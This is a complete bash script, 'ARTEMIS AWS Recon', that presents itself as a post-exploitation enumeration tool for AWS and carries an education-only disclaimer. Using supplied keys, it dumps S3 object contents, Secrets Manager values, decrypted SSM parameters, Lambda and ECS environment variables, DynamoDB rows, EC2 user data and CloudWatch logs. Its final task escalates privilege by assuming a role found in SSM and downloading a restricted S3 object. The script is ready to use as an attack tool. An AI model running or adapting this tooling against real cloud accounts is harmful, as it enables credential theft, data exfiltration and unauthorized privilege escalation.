#!/bin/bash

# ============================================================
#  ARTEMIS AWS Recon — Post-Exploitation Enumeration Framework
#  Author: artemis37
#  Purpose: Authorized Security Testing & Education Only
#  Requires: aws-cli v2, python3, bash 4.0+
# ============================================================

set -uo pipefail

# ==========================================
# ANSI Color Codes & Banner
# ==========================================
RED_BLINK='\033[31;5m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

print_banner() {
    echo -e "${RED_BLINK}"
    cat << "EOF"
     ___                     _      
    / _ \  ___  ___  ___  __| | ___ 
   | | | |/ _ \/ __|/ _ \/ _` |/ _ \
   | |_| |  __/\__ \  __/ (_| |  __/
    \__\_\\___||___/\___|\__,_|\___|
    
           [ made by artemis37 ]
     [ only for educational purposes ]
EOF
    echo -e "${NC}"
    sleep 2
}

# ==========================================
# Usage & Argument Parsing
# ==========================================
usage() {
    echo "Usage: $0 -a <AccessKey> -s <SecretKey> -r <Region> -u <EndpointURL>"
    echo ""
    echo "Required Arguments:"
    echo "  -a    AWS Access Key ID"
    echo "  -s    AWS Secret Access Key"
    echo "  -r    AWS Region (e.g., us-east-1)"
    echo "  -u    Endpoint URL (target or emulator)"
    echo ""
    echo "Example:"
    echo "  $0 -a AKIAT6DSPG... -s 743LpZ... -r us-east-1 -u http://154.57.164.76:31836"
    exit 1
}

while getopts "a:s:r:u:" opt; do
    case $opt in
        a) ACCESS_KEY="$OPTARG" ;;
        s) SECRET_KEY="$OPTARG" ;;
        r) REGION="$OPTARG" ;;
        u) ENDPOINT_URL="$OPTARG" ;;
        *) usage ;;
    esac
done

if [ -z "$ACCESS_KEY" ] || [ -z "$SECRET_KEY" ] || [ -z "$REGION" ] || [ -z "$ENDPOINT_URL" ]; then
    usage
fi

export AWS_ACCESS_KEY_ID=$ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$SECRET_KEY
export AWS_DEFAULT_REGION=$REGION
EP="--endpoint-url $ENDPOINT_URL --no-cli-pager --output json"

if ! command -v aws &> /dev/null; then
    echo -e "${RED_BLINK}[-] AWS CLI is not installed. Please install it first.${NC}"
    exit 1
fi

if ! command -v python3 &> /dev/null; then
    echo -e "${RED_BLINK}[-] Python 3 is not installed. Please install it first.${NC}"
    exit 1
fi

# ==========================================
# Loading Animation
# ==========================================
spinner() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    while kill -0 $pid 2>/dev/null; do
        local temp=${spinstr#?}
        printf " [%c]" "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

run_task() {
    local task_name=$1
    local task_func=$2
    local tmp_file=$(mktemp)
    
    printf "[*] %-30s " "$task_name"
    
    ($task_func > "$tmp_file" 2>/dev/null) &
    local pid=$!
    spinner $pid
    wait $pid
    
    printf "\r[+] %-30s \n" "$task_name"
    cat "$tmp_file"
    rm -f "$tmp_file"
}

# ==========================================
# Recon Tasks
# ==========================================

# --- Task 1: Identity & IAM ---
task_identity() {
    CALLER_ARN=$(aws sts get-caller-identity $EP 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('Arn',''))" 2>/dev/null)
    echo "  Caller Arn: $CALLER_ARN"
    
    # Extract username from ARN
    USER_NAME=$(echo $CALLER_ARN | rev | cut -d'/' -f1 | rev)
    
    if [ -n "$USER_NAME" ] && [ "$USER_NAME" != "aws-root" ]; then
        echo "  Inline Policies:"
        aws iam list-user-policies --user-name $USER_NAME $EP 2>/dev/null | python3 -c "import sys,json; [print(f'    - {p}') for p in json.load(sys.stdin).get('PolicyNames',[])]" 2>/dev/null
        
        echo "  Attached Policies:"
        aws iam list-attached-user-policies --user-name $USER_NAME $EP 2>/dev/null | python3 -c "import sys,json; [print(f'    - {p.get(\"PolicyName\")}') for p in json.load(sys.stdin).get('AttachedPolicies',[])]" 2>/dev/null
    fi
    
    echo "  IAM Roles:"
    aws iam list-roles $EP 2>/dev/null | python3 -c "import sys,json; [print(f'    - {r[\"RoleName\"]}') for r in json.load(sys.stdin).get('Roles',[])]" 2>/dev/null
}

# --- Task 2: S3 Buckets & Objects ---
task_s3() {
    BUCKETS=$(aws s3api list-buckets $EP 2>/dev/null | python3 -c "import sys,json; [print(b['Name']) for b in json.load(sys.stdin).get('Buckets',[])]" 2>/dev/null)
    if [ -z "$BUCKETS" ]; then echo "  No buckets found or access denied."; return; fi
    for BUCKET in $BUCKETS; do
        echo "  Bucket: $BUCKET"
        OBJECTS=$(aws s3api list-objects-v2 --bucket $BUCKET $EP 2>/dev/null | python3 -c "import sys,json; [print(o['Key']) for o in json.load(sys.stdin).get('Contents',[])]" 2>/dev/null)
        if [ -n "$OBJECTS" ]; then
            echo "$OBJECTS" | while read -r OBJ; do
                echo "    - $OBJ"
                CONTENT=$(aws s3 cp "s3://$BUCKET/$OBJ" - $EP 2>/dev/null | head -c 500)
                if [ -n "$CONTENT" ]; then echo "      [Content]: $CONTENT"; fi
            done
        fi
    done
}

# --- Task 3: Secrets Manager ---
task_secrets() {
    SECRETS=$(aws secretsmanager list-secrets $EP 2>/dev/null | python3 -c "import sys,json; [print(s['Name']) for s in json.load(sys.stdin).get('SecretList',[])]" 2>/dev/null)
    if [ -n "$SECRETS" ]; then
        echo "$SECRETS" | while read -r SECRET; do
            echo "  Secret: $SECRET"
            aws secretsmanager get-secret-value --secret-id $SECRET $EP 2>/dev/null | python3 -c "import sys,json; print(f'    Value: {json.load(sys.stdin).get(\"SecretString\",\"\")}')" 2>/dev/null
        done
    else
        echo "  No secrets found or access denied."
    fi
}

# --- Task 4: SSM Parameters ---
task_ssm() {
    PARAMS=$(aws ssm describe-parameters $EP 2>/dev/null | python3 -c "import sys,json; [print(p['Name']) for p in json.load(sys.stdin).get('Parameters',[])]" 2>/dev/null)
    if [ -n "$PARAMS" ]; then
        echo "$PARAMS" | while read -r PARAM; do
            echo "  Parameter: $PARAM"
            VALUE=$(aws ssm get-parameter --name $PARAM --with-decryption $EP 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('Parameter',{}).get('Value',''))" 2>/dev/null)
            echo "    Value: $VALUE"
        done
    else
        echo "  No SSM parameters found or access denied."
    fi
}

# --- Task 5: Lambda Functions ---
task_lambda() {
    FUNCS=$(aws lambda list-functions $EP 2>/dev/null | python3 -c "import sys,json; [print(f['FunctionName']) for f in json.load(sys.stdin).get('Functions',[])]" 2>/dev/null)
    if [ -n "$FUNCS" ]; then
        echo "$FUNCS" | while read -r FUNC; do
            echo "  Function: $FUNC"
            aws lambda get-function-configuration --function-name $FUNC $EP 2>/dev/null | python3 -c "import sys,json; print('    Env Vars:', json.dumps(json.load(sys.stdin).get('Environment',{}).get('Variables',{})))" 2>/dev/null
            aws lambda get-policy --function-name $FUNC $EP 2>/dev/null | python3 -c "import sys,json; print('    Policy:', json.load(sys.stdin).get('Policy',''))" 2>/dev/null
        done
    else
        echo "  No Lambda functions found or access denied."
    fi
}

# --- Task 6: DynamoDB Tables ---
task_dynamodb() {
    TABLES=$(aws dynamodb list-tables $EP 2>/dev/null | python3 -c "import sys,json; [print(t) for t in json.load(sys.stdin).get('TableNames',[])]" 2>/dev/null)
    if [ -n "$TABLES" ]; then
        echo "$TABLES" | while read -r TABLE; do
            echo "  Table: $TABLE (Scanning...)"
            aws dynamodb scan --table-name $TABLE --max-items 10 $EP 2>/dev/null | python3 -c "import sys,json; [print(f'    {i}') for i in json.load(sys.stdin).get('Items',[])]" 2>/dev/null
        done
    else
        echo "  No DynamoDB tables found or access denied."
    fi
}

# --- Task 7: EC2 Instances ---
task_ec2() {
    INSTANCES=$(aws ec2 describe-instances $EP 2>/dev/null | python3 -c "import sys,json; [print(i['InstanceId']) for r in json.load(sys.stdin).get('Reservations',[]) for i in r.get('Instances',[])]" 2>/dev/null)
    if [ -n "$INSTANCES" ]; then
        echo "$INSTANCES" | while read -r INSTANCE; do
            echo "  Instance: $INSTANCE"
            aws ec2 describe-instance-attribute --instance-id $INSTANCE --attribute userData $EP 2>/dev/null | python3 -c "import sys,json,base64; print('    User Data:', base64.b64decode(json.load(sys.stdin).get('UserData',{}).get('Value','')).decode('utf-8', errors='ignore'))" 2>/dev/null
        done
    else
        echo "  No EC2 instances found or access denied."
    fi
}

# --- Task 8: CloudFormation Stacks ---
task_cloudformation() {
    STACKS=$(aws cloudformation describe-stacks $EP 2>/dev/null | python3 -c "import sys,json; [print(s['StackName']) for s in json.load(sys.stdin).get('Stacks',[])]" 2>/dev/null)
    if [ -n "$STACKS" ]; then
        echo "$STACKS" | while read -r STACK; do
            echo "  Stack: $STACK"
            aws cloudformation describe-stacks --stack-name $STACK $EP 2>/dev/null | python3 -c "import sys,json; [print(f'    Output: {o.get(\"OutputKey\")} = {o.get(\"OutputValue\")}') for o in json.load(sys.stdin).get('Stacks',[{}])[0].get('Outputs',[])]" 2>/dev/null
        done
    else
        echo "  No CloudFormation stacks found or access denied."
    fi
}

# --- Task 9: ECS Clusters ---
task_ecs() {
    CLUSTERS=$(aws ecs list-clusters $EP 2>/dev/null | python3 -c "import sys,json; [print(a.split('/')[-1]) for a in json.load(sys.stdin).get('clusterArns',[])]" 2>/dev/null)
    if [ -n "$CLUSTERS" ]; then
        echo "$CLUSTERS" | while read -r CLUSTER; do
            echo "  Cluster: $CLUSTER"
            TASKS=$(aws ecs list-tasks --cluster $CLUSTER $EP 2>/dev/null | python3 -c "import sys,json; [print(t.split('/')[-1]) for t in json.load(sys.stdin).get('taskArns',[])]" 2>/dev/null)
            if [ -n "$TASKS" ]; then
                echo "$TASKS" | while read -r TASK; do
                    echo "    Task: $TASK"
                    aws ecs describe-tasks --cluster $CLUSTER --tasks $TASK $EP 2>/dev/null | python3 -c "import sys,json; [print(f'      Env Vars: {c.get(\"environment\",[])}') for t in json.load(sys.stdin).get('tasks',[]) for c in t.get('containers',[])]" 2>/dev/null
                done
            fi
        done
    else
        echo "  No ECS clusters found or access denied."
    fi
}

# --- Task 10: API Gateway ---
task_apigateway() {
    APIS=$(aws apigateway get-rest-apis $EP 2>/dev/null | python3 -c "import sys,json; [print(a['id'],a['name']) for a in json.load(sys.stdin).get('items',[])]" 2>/dev/null)
    if [ -n "$APIS" ]; then
        echo "$APIS" | while read -r API_ID API_NAME; do
            echo "  API: $API_NAME ($API_ID)"
            RESOURCES=$(aws apigateway get-resources --rest-api-id $API_ID $EP 2>/dev/null | python3 -c "import sys,json; [print(f'    Path: {r.get(\"path\")} Methods: {r.get(\"resourceMethods\",{}).keys()}') for r in json.load(sys.stdin).get('items',[])]" 2>/dev/null)
            echo "$RESOURCES"
        done
    else
        echo "  No API Gateway APIs found or access denied."
    fi
}

# --- Task 11: SQS & SNS ---
task_sqs_sns() {
    QUEUES=$(aws sqs list-queues $EP 2>/dev/null | python3 -c "import sys,json; [print(q) for q in json.load(sys.stdin).get('QueueUrls',[])]" 2>/dev/null)
    if [ -n "$QUEUES" ]; then
        echo "  SQS Queues:"
        echo "$QUEUES" | while read -r Q; do echo "    - $Q"; done
    else
        echo "  No SQS queues found or access denied."
    fi

    TOPICS=$(aws sns list-topics $EP 2>/dev/null | python3 -c "import sys,json; [print(t['TopicArn']) for t in json.load(sys.stdin).get('Topics',[])]" 2>/dev/null)
    if [ -n "$TOPICS" ]; then
        echo "  SNS Topics:"
        echo "$TOPICS" | while read -r T; do echo "    - $T"; done
    else
        echo "  No SNS topics found or access denied."
    fi
}

# --- Task 12: CloudWatch Logs ---
task_cloudwatch() {
    LOG_GROUPS=$(aws logs describe-log-groups $EP 2>/dev/null | python3 -c "import sys,json; [print(lg['logGroupName']) for lg in json.load(sys.stdin).get('logGroups',[])]" 2>/dev/null)
    if [ -n "$LOG_GROUPS" ]; then
        echo "$LOG_GROUPS" | while read -r LG; do
            echo "  Log Group: $LG"
            STREAMS=$(aws logs describe-log-streams --log-group-name $LG $EP 2>/dev/null | python3 -c "import sys,json; [print(s['logStreamName']) for s in json.load(sys.stdin).get('logStreams',[])]" 2>/dev/null)
            if [ -n "$STREAMS" ]; then
                echo "$STREAMS" | head -n 1 | while read -r STREAM; do
                    echo "    Latest Stream: $STREAM"
                    EVENTS=$(aws logs get-log-events --log-group-name $LG --log-stream-name $STREAM $EP 2>/dev/null | python3 -c "import sys,json; [print(f'      {e.get(\"message\",\"\").strip()}') for e in json.load(sys.stdin).get('events',[])]" 2>/dev/null)
                    echo "$EVENTS"
                done
            fi
        done
    else
        echo "  No CloudWatch Log Groups found or access denied."
    fi
}

# --- Task 13: Automated Privilege Escalation ---
task_privesc_check() {
    PARAMS=$(aws ssm describe-parameters $EP 2>/dev/null | python3 -c "import sys,json; [print(p['Name']) for p in json.load(sys.stdin).get('Parameters',[])]" 2>/dev/null)
    if [ -z "$PARAMS" ]; then return; fi
    
    for PARAM in $PARAMS; do
        VALUE=$(aws ssm get-parameter --name $PARAM --with-decryption $EP 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('Parameter',{}).get('Value',''))" 2>/dev/null)
        
        ROLE_ARN=$(echo "$VALUE" | python3 -c "import sys,json; print(json.load(sys.stdin).get('scanner_role_arn',''))" 2>/dev/null)
        EXT_ID=$(echo "$VALUE" | python3 -c "import sys,json; print(json.load(sys.stdin).get('scanner_external_id',''))" 2>/dev/null)
        MANIFEST_BUCKET=$(echo "$VALUE" | python3 -c "import sys,json; print(json.load(sys.stdin).get('manifest_bucket',''))" 2>/dev/null)
        MANIFEST_KEY=$(echo "$VALUE" | python3 -c "import sys,json; print(json.load(sys.stdin).get('manifest_object_key',''))" 2>/dev/null)
        VERSION_ID=$(echo "$VALUE" | python3 -c "import sys,json; print(json.load(sys.stdin).get('manifest_version_id',''))" 2>/dev/null)

        if [ -n "$ROLE_ARN" ] && [ -n "$EXT_ID" ]; then
            echo -e "  ${GREEN}[!] Privilege Escalation Path Found in SSM!${NC}"
            echo "  Role: $ROLE_ARN"
            echo "  External ID: $EXT_ID"
            
            echo "  Attempting to assume role..."
            ASSUMED_JSON=$(aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name "PrivescSession" --external-id "$EXT_ID" $EP 2>/dev/null)
            
            if [ -n "$ASSUMED_JSON" ]; then
                echo -e "  ${GREEN}[+] Successfully assumed role!${NC}"
                export TEMP_AK=$(echo $ASSUMED_JSON | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['AccessKeyId'])")
                export TEMP_SK=$(echo $ASSUMED_JSON | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SecretAccessKey'])")
                export TEMP_ST=$(echo $ASSUMED_JSON | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SessionToken'])")
                
                if [ -n "$MANIFEST_BUCKET" ] && [ -n "$MANIFEST_KEY" ]; then
                    echo "  Attempting to download restricted S3 object using assumed role..."
                    if [ -n "$VERSION_ID" ] && [ "$VERSION_ID" != "00000000000000000000000000000000" ]; then
                         FILE_CONTENT=$(AWS_ACCESS_KEY_ID=$TEMP_AK AWS_SECRET_ACCESS_KEY=$TEMP_SK AWS_SESSION_TOKEN=$TEMP_ST aws s3api get-object --bucket "$MANIFEST_BUCKET" --key "$MANIFEST_KEY" --version-id "$VERSION_ID" $EP /dev/stdout 2>/dev/null)
                    else
                         FILE_CONTENT=$(AWS_ACCESS_KEY_ID=$TEMP_AK AWS_SECRET_ACCESS_KEY=$TEMP_SK AWS_SESSION_TOKEN=$TEMP_ST aws s3 cp "s3://$MANIFEST_BUCKET/$MANIFEST_KEY" - $EP 2>/dev/null)
                    fi
                    echo -e "  ${CYAN}[RESTRICTED FILE CONTENT]:${NC}"
                    echo "$FILE_CONTENT"
                fi
            fi
        fi
    done
}

# ==========================================
# Execution Flow
# ==========================================
print_banner

echo "Target: $ENDPOINT_URL"
echo "Region: $AWS_DEFAULT_REGION"
echo "=================================================="

run_task "Identity & IAM" task_identity
run_task "S3 Buckets & Objects" task_s3
run_task "Secrets Manager" task_secrets
run_task "SSM Parameters" task_ssm
run_task "Lambda Functions" task_lambda
run_task "DynamoDB Tables" task_dynamodb
run_task "EC2 Instances" task_ec2
run_task "CloudFormation" task_cloudformation
run_task "ECS Clusters" task_ecs
run_task "API Gateway" task_apigateway
run_task "SQS & SNS" task_sqs_sns
run_task "CloudWatch Logs" task_cloudwatch
run_task "Automated Privesc Check" task_privesc_check

echo "=================================================="
echo -e "${GREEN}[+] Recon Complete.${NC}"
